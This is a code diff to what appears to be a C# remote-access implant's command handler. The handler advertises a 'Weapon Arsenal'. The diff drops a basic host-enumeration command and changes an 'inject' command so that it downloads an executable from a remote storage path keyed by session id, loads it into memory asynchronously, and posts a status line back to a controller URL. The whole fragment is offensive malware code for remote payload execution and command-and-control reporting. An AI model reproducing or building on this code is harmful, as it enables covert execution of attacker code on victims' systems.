@@ -35,9 +35,8 @@ namespace CursedSpaghetti
             {
                 return "!#!\n  Weapon Arsenal\n" +
                     " ----------------------------------------------------------\n" +
-                    "   basicenum               Basic enumeration\n" +
                     "   help                    Print this message\n" +
-                    "   autoinject              Inject an executable into the memory\n";
+                    "   inject              Inject an executable into the memory\n";
 
             }
         }
@@ -102,12 +101,10 @@ namespace CursedSpaghetti
 
             switch (weapon.Split(' ')[0].ToLower())
             {
-                case "basicenum":
-                    Gatherer.ListBasicOSInfo(url);
-                    break;
                 case "inject":
                     string targetFile = weapon.Substring(7).Replace(" ", "");
-                    output = Injector.run(String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, targetFile));
+                    Injector.runAsync(String.Format("{0}Storage/{1}/{2}", fs_url, sessionid, targetFile));
+                    output = String.Format("[*] {0} : Loading initilized.\n[*] You won't receive any results.", targetFile);
                     Post(url, output);
                     break;
                 case "help":
